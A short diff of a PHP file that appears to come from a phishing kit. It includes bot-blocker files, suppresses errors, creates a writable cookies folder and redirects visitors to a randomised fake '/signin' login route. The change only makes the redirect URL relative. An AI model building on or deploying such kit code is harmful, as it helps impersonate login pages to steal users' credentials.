@@ -5,14 +5,14 @@ include '../blockerz.php';
 include '../blockerz2.php';
 include '../sc.php';
 include '../curl.php';
-$url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$DIR;
+
 
 if (!file_exists('cookies')) {@mkdir('cookies', 0777, true);}
 
 error_reporting(0);
 
 if (!isset($_GET['ID']) && !isset($_GET['status'])) {
-    echo "<META HTTP-EQUIV='refresh' content='0; URL=".$url."/?ID=login&Key=".@md5(@microtime())."&login&path=/signin/?referrer'>";
+    echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=login&Key=".@md5(@microtime())."&login&path=/signin/?referrer'>";
 exit();
 }
 
